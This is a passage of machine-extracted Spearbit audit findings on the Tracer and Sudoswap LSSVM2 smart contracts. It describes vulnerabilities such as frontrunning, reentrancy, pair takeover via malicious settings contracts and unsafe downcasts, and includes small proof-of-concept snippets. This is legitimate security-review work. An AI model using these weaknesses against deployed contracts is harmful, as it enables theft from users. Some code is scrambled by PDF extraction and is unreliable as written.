deployPool() per(deploymentParameters.oracleWrapper).deployer() == msg.sender frontrunning the deployment transaction of the pool. function the In of contract, check the protects IOracleWrap- against This is because the poolCommitter, LeveragedPool and the pair tokens instances are deployed at a deterministic address, calculated from the values of leverageAmount, quoteToken and oracleWrapper. An attacker cannot frontrun the pool deployment because of the different msg.sender address, that causes the deployer() check to fail. Alternatively, the attacker will have a different oracleWrapper, resulting in a different pool. However, this is not obvious to a casual reader. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require( IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\" ); ... bytes32 uniquePoolHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper ) ); PoolCommitter poolCommitter = PoolCommitter( Clones.cloneDeterministic(poolCommitterBaseAddress, uniquePoolHash) ); ... LeveragedPool pool = LeveragedPool(Clones.cloneDeterministic(poolBaseAddress, uniquePoolHash)); ... } function deployPairToken(... ) internal returns (address) { ... bytes32 uniqueTokenHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper, direction ) ); PoolToken pairToken = PoolToken(Clones.cloneDeterministic(pairTokenBaseAddress, ,! uniqueTokenHash)); ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "No event exists for users self-claiming commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no event emitted when a user self-claims a previous commit for themselves, in contrast to claim() which does emit the PaidRequestExecution event.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Mixups of types and scaling factors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There are a few findings that are related to mixups of types or scaling factors. The following types and scaling factors are used:  uint (no scaling)  uint (WAD scaling)  ABDKMathQuad  ABDKMathQuad (WAD scaling) Solidity >0.8.9s user defined value types could be used to prevent mistakes. This will require several typecasts, but they dont add extra gas costs.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Missing events for setInvariantCheck() and setAutoClaim() in PoolFactory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Events should be emitted for access-controlled critical functions, and functions that set protocol parameters or affect the protocol in significant ways.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Terminology used for tokens and oracles is not clear and consistent across codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Different terms are used across the codebase to address the different tokens, leading to some mixups. Assuming a pair BTC/USDC is being tracked with WETH as collateral, we think the following definitions apply:  collateral token == quote token == settlement token == WETH  pool token == long token + short token == long BTC/USDC + short BTC/USDC As for the oracles:  settlementEthOracle is the oracle for settlement in ETH (WETH/ETH)  oracleWrapper is the oracle for BTC/USDC Here is an example of a mixup: The comments in getMint() and getBurn() are different while their result should be similar. It seems the comment on getBurn() has reversed settlement and pool tokens. * @notice Calculates the number of pool tokens to mint, given some settlement token amount and a ,! price ... * @return Quantity of pool tokens to mint ... function getMint(bytes16 price, uint256 amount) public pure returns (uint256) { ... } * @notice Calculate the number of settlement tokens to burn, based on a price and an amount of ,! pool tokens //settlement & pool seem reversed ... * @return Quantity of pool tokens to burn ... function getBurn(bytes16 price, uint256 amount) public pure returns (uint256) { ... } The settlementTokenPrice variable in keeperGas() is misleading and not clear whether it is Eth per Settlement or Settlement per Eth. contract PoolKeeper is IPoolKeeper, Ownable { function keeperGas(..) public view returns (uint256) { int256 settlementTokenPrice = ,! IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).getPrice(); ... } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Incorrect NatSpec and comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some NatSpec documentation and comments contain incorrect or unclear information. In PoolSwapLibraryL283-L293, the NatSpec for the isBeforeFrontRunningInterval() function refers to uncom- mitment, which is not longer supported. * @notice Returns true if the given timestamp is BEFORE the frontRunningInterval starts, * function isBeforeFrontRunningInterval(...) which is allowed for uncommitment. In LeveragedPool.sol#L511 the NatSpec for the withdrawQuote() function notes that the pool should not be paused while the require checks that it is paused. * @dev Pool must not be paused function withdrawQuote() ... { require(paused, \"Pool is live\"); In LeveragedPool.sol#L47 the comment is unclear, as it references a singular update interval but the mapping points to arrays. // The most recent update interval in which a user committed mapping(address => uint256[]) public unAggregatedCommitments; In PoolToken.sol#L16-L23 both the order and the meaning of the documentation are wrong.  The @param lines order should be switched.  @param amount Pool tokens to burn should be replaced with @param amount Pool tokens to mint  @param account Account to burn pool tokens to should be replaced with @param account Account to mint pool tokens to /** * @notice Mints pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens to + * @param account Account to mint pool tokens to + * @param amount Pool tokens to mint */ function mint(address account, uint256 amount) external override onlyOwner { ... } In PoolToken.sol#L25-L32 the order of the @param lines is reversed. 47 /** * @notice Burns pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens from + * @param account Account to burn pool tokens from + * @param amount Pool tokens to burn */ function burn(address account, uint256 amount) external override onlyOwner { ... } In PoolFactory.sol#L176-L203 the NatSpec @param for poolOwner is missing. It would also be suggested to change the parameter name from poolOwner to pool, since the parameter received from deployPool is the address of the pool and not the owner of the pool. /** * @notice Deploy a contract for pool tokens + * @param pool The pool address, owner of the Pool Token * @param leverage Amount of leverage for pool * @param deploymentParameters Deployment parameters for parent function * @param direction Long or short token, L- or S- * @return Address of the pool token */ function deployPairToken( - + address poolOwner, address pool, string memory leverage, PoolDeployment memory deploymentParameters, string memory direction ) internal returns (address) { ... pairToken.initialize(poolOwner, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); pairToken.initialize(pool, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); ... - + } In PoolSwapLibrary.sol#L433-L454 the comments for two of the parameters of function getMintWithBurns() are reversed. * @param amount ... * @param oppositePrice ... ... function getMintWithBurns( ... bytes16 oppositePrice, uint256 amount, ... ) public pure returns (uint256) { ... In ERC20_Cloneable.sol#L46-L49 a comment at the constructor of contract ERC20_Cloneable mentions a default value of 18 for decimals. However, it doesnt use this default value, but the supplied parameter. Moreover, a comment at the constructor of ERC20_Cloneable contract mentions _setupDecimals. This is probably a reference to an old version of the OpenZeppelin ERC20 contracts, and no longer relevant. Additionally, the comments say the values are immutable, but they are set in the initialize() function. 48 @dev Sets the values for {name} and {symbol}, initializes {decimals} with * a default value of 18. * To select a different value for {decimals}, use {_setupDecimals}. * * construction. All three of these values are immutable: they can only be set once during ... constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) { _decimals = decimals_; } function initialize(address _pool, string memory name_, string memory symbol_, uint8 decimals_) ,! external initializer { owner = _pool; _name = name_; _symbol = symbol_; _decimals = decimals_; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Partial fills for buy orders in ERC1155 swaps will fail when pair has insufficient balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Partial fills are currently supported for buy orders in VeryFastRouter.swap(). When _findMaxFil- lableAmtForBuy() determines numItemsToFill, it is not guaranteed that the underlying pair has so many items left to fill. While ERC721 swap handles the scenario where pair balance is less than numItemsToFill in the logic of _findAvailableIds() (maxIdsNeeded vs numIdsFound), ERC1155 swap is missing a similar check and reduction of item numbers when required. Partial fills for buy orders in ERC1155 swaps will fail when the pair has a balance less than numItemsToFill as determined by _findMaxFillableAmtForBuy(). Partial filling, a key feature of VeryFastRouter, will then not work as expected and would lead to an early revert which defeats the purpose of swap().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Function token() of cloneERC1155ERC20Pair() reads from wrong location", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function token() loads the token data from position 81. However on ERC1155 pairs it should load it from position 93. Currently, it doesn't retrieve the right values and the code won't function correctly. LSSVMPair.sol: LSSVMPair.sol: 20))) ,! LSSVMPair.sol: 40))) ,! LSSVMPair.sol: 60))) _factory _bondingCurve := shr(0x60, calldataload(sub(calldatasize(), paramsLength))) := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), ,! LSSVMPairERC1155.sol: id LSSVMPairERC721.sol: _propertyChecker := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), := calldataload(add(sub(calldatasize(), paramsLength), 61)) 61))) ,! LSSVMPairERC20.sol: ,! 81))) _token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), function cloneERC1155ERC20Pair(... ) ... { assembly { ... mstore(add(ptr, 0x3e), shl(0x60, factory)) - 20 bytes mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) // position 20 - 20 bytes // position 40 - 20 bytes mstore(add(ptr, 0x66), shl(0x60, nft)) // position 60 - 1 bytes mstore8(add(ptr, 0x7a), poolType) // position 61 - 32 bytes mstore(add(ptr, 0x7b), nftId) mstore(add(ptr, 0x9b), shl(0x60, token)) // position 93 - 20 bytes ... // position 0 } } 6", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Switched order of update leads to incorrect partial fill calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In the binary search, the order of updation of start and numItemsToFill is switched with start being updated before numItemsToFill which itself uses the value of start: start = (start + end)/2 + 1; numItemsToFill = (start + end)/2; This leads to incorrect partial fill calculations when binary search recurses on the right half.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Swap functions with sell orders in LSSVMRouter will fail for property-check enforced pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Swap functions with sell orders in LSSVMRouter will revert for property-check enforced pairs. While VeryFastRouter swap function supports sell orders to specify property check parameters for pairs enforcing them, none of the swap functions in LSSVMRouter support the same.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "pairTransferERC20From() only supports ERC721 NFTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Function pairTransferERC20From() which is is present in both LSSVMRouter and VeryFastRouter, only checks for ERC721_ERC20. This means ERC1155 NFTs are not supported by the routers. The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } 7", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Insufficient application of trading fee leads to 50% loss for LPs in swapTokenForAnyNFTs()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol applies a trading fee of 2*tradeFee on NFT buys from pairs (to compensate for 0 fees on NFT sells as noted in the comment: \"// We pull twice the trade fee on buys but don't take trade fee on sells if assetRecipient is set\"). this While ERC1155.swapTokenForSpecificNFTs(), trading fee of only tradeFee (instead of 2*tradeFee). enforced in is LSSVMPairERC721.swapTokenForSpecificNFTs() LSSVMPairERC1155.swapTokenForAnyNFTs() and LSSVMPair- a enforces Affected LPs of pairs targeted by LSSVMPairERC1155. swapTokenForAnyNFTs() will unexpectedly lose 50% of the trade fees.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Royalty not always being taken into account leads to incorrect protocol accounting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getSellNFTQuoteWithRoyalties() is similar to getSellNFTQuote(), except that it also takes the royalties into account. When the function robustSwapNFTsForToken() of the LSSVMRouter is called, it first calls getSellNFTQuote() and checks that a sufficient amount of tokens will be received. Then it calls swapNFTs- ForToken() with 0 as minExpectedTokenOutput; so it will accept any amount of tokens. The swapNFTsForToken() does subtract the Royalties which will result in a lower amount of tokens received and might not be enough to satisfy the requirements of the seller. The same happens in  robustSwapETHForSpecificNFTsAndNFTsToToken and  robustSwapERC20ForSpecificNFTsAndNFTsToToken. Note: Function getSellNFTQuote() of StandardSettings.sol also uses getSellNFTQuote(). However there it is compared to the results of getBuyInfo(); so this is ok as both don't take the royalties into account. Note: getNFTQuoteForSellOrderWithPartialFill() also has to take royalties into account. 8 function getSellNFTQuote(uint256 numNFTs) ... { ( (...., outputAmount, ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(uint256 assetId, uint256 numNFTs) ... { (..., outputAmount, ... ) = bondingCurve().getSellInfo(...); (,, uint256 royaltyTotal) = _calculateRoyaltiesView(assetId, outputAmount); ... outputAmount -= royaltyTotal; } function robustSwapNFTsForToken(...) ... { ... (error,,, pairOutput,) = swapList[i].swapInfo.pair.getSellNFTQuote(swapList[i].swapInfo.nftIds.length); ... if (pairOutput >= swapList[i].minOutput) { ....swapNFTsForToken(..., 0, ...); } ... ,! } function swapNFTsForToken(...) ... { ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(numNFTs[0], _bondingCurve, _factory); (... royaltyTotal) = _calculateRoyalties(nftId(), outputAmount); ... outputAmount -= royaltyTotal; ... _sendTokenOutput(tokenRecipient, outputAmount); ,! }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Error return codes of getBuyInfo() and getSellInfo() are sometimes ignored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions getBuyInfo() and getSellInfo() return an error code when they detect an error. The rest of the returned parameters then have an unusable/invalid value (0). However, some callers of these functions ignore the error code and continue processing with the other unusable/invalid values. The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() pass through the error code, so their callers have to check the error codes too. 9 function getBuyInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getSellInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getBuyNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "changeSpotPriceAndDelta() only uses ERC721 version of balanceOf()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function changeSpotPriceAndDelta() uses balanceOf() with one parameter. This is the ERC721 variant. In order to support ERC1155, a second parameter of the NFT id has to be supplied. function changeSpotPriceAndDelta(address pairAddress, ...) public { ... if ((newPriceToBuyFromPair < priceToBuyFromPair) && pair.nft().balanceOf(pairAddress) >= 1) { ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "_pullTokenInputAndPayProtocolFee() doesn't check that tokens are received", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _pullTokenInputAndPayProtocolFee() doesn't verify that it actually received the to- kens after doing safeTransferFrom(). This can be an issue with fee on transfer tokens. This is also an issue with (accidentally) non-existing tokens, as safeTransferFrom() won't revert on that, see POC below. Note: also see issue \"Malicious router mitigation may break for deflationary tokens\". function _pullTokenInputAndPayProtocolFee(...) ... { ... _token.safeTransferFrom(msg.sender, _assetRecipient, saleAmount); ... } Proof Of Concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import \"hardhat/console.sol\"; import {ERC20} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/tokens/ERC20.sol\"; ,! import {SafeTransferLib} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/SafeTransferLib.sol\"; ,! contract test { using SafeTransferLib for ERC20; function t() public { ERC20 _token = ERC20(address(1)); _token.safeTransferFrom(msg.sender, address(0), 100); console.log(\"after safeTransferFrom\"); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious settings contract can call onOwnershipTransferred() to take over pair", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function onOwnershipTransferred() can be called from a pair via call(). This can be done It can either before transferOwnership() or after it. If it is called before then it updates the AssetRecipient. only be called after the transferOwnership() when an alternative (malicious) settings contract is used. In that situation pairInfos[] is overwritten and the original owner is lost; so effectively the pair can be taken over. Note: if the settings contract is malicious then there are different ways to take over the pair, but using this approach the vulnerabilities can be hidden. 11 function onOwnershipTransferred(address prevOwner, bytes memory) public payable { ILSSVMPair pair = ILSSVMPair(msg.sender); require(pair.poolType() == ILSSVMPair.PoolType.TRADE, \"Only TRADE pairs\"); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "One can attempt to steal a pair's ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Anyone can pass the enrolled pair's address instead of a splitter address in bulkWithdrawFees() to effectively call the pair's withdrawAllETH() instead of a splitter's withdrawAllETH(). Anyone can attempt to steal/drain all the ETH from a pair. However, the pair's withdrawAllETH() sends ETH to the owner, which in this case is the settings contract. The settings contract is unable to receive ETH as currently implemented. So the attempt reverts.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "swap() could mix tokens with ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function swap() adds the output of swapNFTsForToken() to the ethAmount. Although this only happens when order.isETHSell == true , this value could be set to the wrong value accidentally or on purpose. Then the number of received ERC20 tokens could be added to the ethAmount, which is clearly unwanted. The resulting ethAmount is returned to the user. Luckily the router (normally) doesn't have extra ETH so the impact should be limited. function swap(Order calldata swapOrder) external payable { uint256 ethAmount = msg.value; if (order.isETHSell && swapOrder.recycleETH) { ... outputAmount = pair.swapNFTsForToken(...); ... ethAmount += outputAmount; ... } ... // Send excess ETH back to token recipient if (ethAmount > 0) { payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Using a single tokenRecipient in VeryFastRouter could result in locked NFTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "VeryFastRouter uses a single tokenRecipient address for both ETH/tokens and NFTs, unlike LSSVMRouter which uses a separate tokenRecipient and nftRecipient. It is error-prone to have a single tokenRecipient receive both tokens and NFTs, especially when the other/existing LSSVMRouter has a separate nftRecipient. VeryFastRouter.swap() sends both sell order tokens to tokenRe- cipient and buy order NFTs to tokenRecipient. Front-ends integrating with both routers (or migrating to the new one) may surprise users by sending both tokens+NFTs to the same address when interacting with this router. This coupled with the use of nft.transferFrom() may result in NFTs being sent to contracts that are not ERC-721 receivers and get them locked forever.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Owner can mislead users by abusing changeSpotPrice() and changeDelta()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A malicious owner could set up a pair which promises to buy NFTs for high prices. As soon as someone tries to trade, the owner could frontrun the transaction by setting the spotprice to 0 and gets the NFT for free. Both changeSpotPrice() and changeDelta() can be used to immediately change trade parameters where the aftereffects depends on the curve being used. Note: The swapNFTsForToken() parameter minExpectedTokenOutput and swapTokenForSpecificNFTs() param- eter maxExpectedTokenInput protect users against sudden price changes. But users might not always set them in an optimal way. A design goal of the project team is that the pool owner can quickly respond to changing market conditions, to prevent unnecessary losses. function changeSpotPrice(uint128 newSpotPrice) external onlyOwner { ... } function changeDelta(uint128 newDelta) external onlyOwner { ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Pair may receive less ETH trade fees than expected under certain conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Depending on the values of protocol fee and royalties, if _feeRecipient == _assetRecipient, the pair will receive less trade fees than expected. Assume a scenario where inputAmount == 100, protocolFee == 30, royaltyTotal == 60 and tradeFeeAmount == 20. This will result in a revert because of underflow in saleAmount -= tradeFeeAmount; when _feeRecipient != _assetRecipient. However, when _feeRecipient == _assetRecipient, the pair will receive trade fees of 100 - 30 - 60 = 10, whereas it normally would have expected 20.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Swapping tokens/ETH for NFTs may exhibit unexpected behavior for certain values of input amount, trade fees and royalties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The _pullTokenInputAndPayProtocolFee() function pulls ERC20/ETH from caller/router and pays protocol fees, trade fees and royalties proportionately. Trade fees have a threshold of MAX_FEE == 50%, which allows 2*fee to be 100%. Royalty amounts could technically be any percentage as well. This allows edge cases where the protocol fee, trade fee and royalty amounts add up to be > inputAmount. In LSSVMPairERC20, the ordering of subtracting/transferring the protocolFee and royaltyTotal first causes the final attempted transfer of tradeFeeAmount to either revert because of unavailable funds or uses any balance funds from the pair itself. In LSSVMPairETH, the ordering of subtracting/transferring the tradeFees and royaltyTotal first causes the final attempted transfer of protocolFee to either revert because of unavailable funds or uses any balance funds from the pair itself.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "NFTs may be exchanged for 0 tokens when price decreases too much", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The sale of multiple NFTs, in combination with linear curves, results in a price decrease. When the resulting price is below 0, then getSellInfo() calculates how many NFTs are required to reach a price of 0. However, the complete number of NFTs is transferred from the originator of the transaction, even while the last few NFTs are worth 0. This might be undesirable for the originator. function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 totalPriceDecrease = delta * numItems; if (spotPrice < totalPriceDecrease) { ... uint256 numItemsTillZeroPrice = spotPrice / delta + 1; numItems = numItemsTillZeroPrice; } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "balanceOf() can be circumvented via reentrancy and two pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A reentrancy issue can occur if two pairs with the same ERC1155 NFTid are deployed. Via a call to swap NFTs, the ERC1155 callback onERC1155BatchReceived() is called. This callback can start a second NFT swap via a second pair. As the second pair has its own reentrancy modifier, this is allowed. This way the balanceOf() check of _takeNFTsFromSender() can be circumvented. If a reentrant call, to a second pair, supplies a sufficient amount of NFTs then the balanceOf() check of the original call can be satisfied at the same time. We haven't found a realistic scenario to abuse this with the current routers. Permissionless routers will certainly increase the risk as they can abuse isRouter == true. If the router is mali- cious then it also has other ways to steal the NFTs; however with the reentrancy scenario it might be less obvious this is happening. Note: ERC777 tokens also contain such a callback and have the same interface as ERC20 so they could be used in an ERC20 pair. function _takeNFTsFromSender(IERC1155 _nft, uint256 numNFTs, bool isRouter, address routerCaller) ... { ... if (isRouter) { ... uint256 beforeBalance = _nft.balanceOf(_assetRecipient, _nftId); ... router.pairTransferERC1155From(...); // reentrancy with other pair require((_nft.balanceOf(_assetRecipient, _nftId) - beforeBalance) == numNFTs, ...); // circumvented } else { ... } ,! }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Function call() is risky and can be restricted further", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function call() is powerful and thus risky. To reduce the risk it can be restricted further by dis- allowing potentially dangerous function selectors. This is also a step closer to introducing permissionless routers. function call(address payable target, bytes calldata data) external onlyOwner { ILSSVMPairFactoryLike _factory = factory(); require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result,) = target.call{value: 0}(data); require(result, \"Call failed\"); } 16", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Incorrect newSpotPrice and newDelta may be obtained due to unsafe downcasts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "When calculating newSpotPrice in getBuyInfo(), an unsafe downcast from uint256 into uint128 may occur and silently overflow, leading to much less value for newSpotPrice than expected. function getBuyInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 inputValue, uint256 tradeFee, uint256 protocolFee ) { ... } // get the pair's virtual nft and token reserves uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // calculate the amount to send in uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... // set the new virtual reserves newSpotPrice = uint128(spotPrice + inputValueWithoutFee); // token reserve ... Same happens when calculating newDelta in getSellInfo(): function getSellInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 outputValue, uint256 tradeFee, uint256 protocolFee ) { PoC ... // get the pair's virtual nft and eth/erc20 balance uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // set the new virtual reserves newDelta = uint128(nftBalance + numItems); // nft reserve ... Proof of concept about how this wouldn't revert but silently overflow: 17 import \"hardhat/console.sol\"; contract test{ constructor() { uint256 a = type(uint128).max; uint256 b = 2; uint128 c = uint128(a + b); console.log(c); // c == 1, no error } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Fewer checks in pairTransferNFTFrom() and pairTransferERC1155From() than in pairTransfer- ERC20From()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions pairTransferNFTFrom() and pairTransferERC1155From() don't verify that the cor- rect type of pair is used, whereas pairTransferERC20From() does. This means actions could be attempted on the wrong type of pairs. These could succeed for example if a NFT is used that supports both ERC721 and ERC1155. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\" The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } function pairTransferNFTFrom(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferERC1155From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious collection admin can reclaim a pair at any time to deny enhanced setting royalties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A collection admin can forcibly/selectively call reclaimPair() prematurely (before the advertised and agreed upon lockup period) to unilaterally break the settings contract at any time. This will effectively lead to a DoS to the pair owner for the enhanced royalty terms of the setting despite paying the upfront fee and agreeing to a fee split in return. This is because the unlockTime is enforced only on the previous pair owner and not on collection admins. A malicious collection admin can advertise very attractive setting royalty terms to entice pair owners to pay a high upfront fee to sign-up for their settings contract but then force-end the contract prematurely. This will lead to the pair owner losing the paid upfront fee and the promised attractive royalty terms. A lax pair owner who may not be actively monitoring SettingsRemovedForPair events before the lockup period will be surprised at the prematurely forced settings contract termination by the collection admin, loss of their earlier paid upfront fee and any payments of default royalty instead of their expected enhanced amounts.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "PropertyCheckers and Settings not sufficiently restricted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The LSSVMPairFactory accepts any address for external contracts which contain critical logic but there are no sanity checks done on them. These are the _bondingCurve, _propertyChecker and settings con- tracts. The contracts could perhaps be updated later via a proxy pattern or a create2/selfdestruct pattern which means that it's difficult to completely rely on them. Both _propertyChecker and settings contracts have a factory associated: PropertyCheckerFactory and StandardSettingsFactory. It is straightforward to enforce that only contracts created by the factory can be used. For the bondingCurves there is a whitelist that limits the risk. function createPairERC721ETH(..., ICurve _bondingCurve, ..., address _propertyChecker, ...) ... { ... // no checks on _bondingCurve and _propertyChecker } function toggleSettingsForCollection(address settings, address collectionAddress, bool enable) public { ... // no checks on settings } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external onlyOwner { bondingCurveAllowed[bondingCurve] = isAllowed; emit BondingCurveStatusUpdate(bondingCurve, isAllowed); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious router can skip transfer of royalties and protocol fee", "html_url": 